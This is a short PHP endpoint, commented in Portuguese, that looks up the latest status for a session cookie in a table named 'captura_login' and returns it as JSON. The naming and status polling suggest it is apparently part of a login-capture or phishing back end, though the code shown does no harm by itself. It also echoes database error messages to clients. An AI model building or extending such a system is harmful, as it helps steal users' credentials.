<?php
// api_check_status.php
header('Content-Type: application/json');

// Inclui a conexão com o banco
require 'db.php';

// Se não houver cookie, não há o que verificar.
if (!isset($_COOKIE['identificador_cliente'])) {
    echo json_encode(['status' => 'erro', 'message' => 'Cookie de sessão não encontrado.']);
    exit;
}

$session_id = $_COOKIE['identificador_cliente'];

try {
    // Busca o status da entrada mais recente para esta sessão
    $stmt = $pdo->prepare(
        "SELECT status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
    );
    $stmt->execute([$session_id]);
    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($resultado) {
        // Retorna o status encontrado no banco de dados
        echo json_encode(['status' => $resultado['status']]);
    } else {
        echo json_encode(['status' => 'nao_encontrado']);
    }

} catch (PDOException $e) {
    echo json_encode(['status' => 'erro_db', 'message' => $e->getMessage()]);
}
?>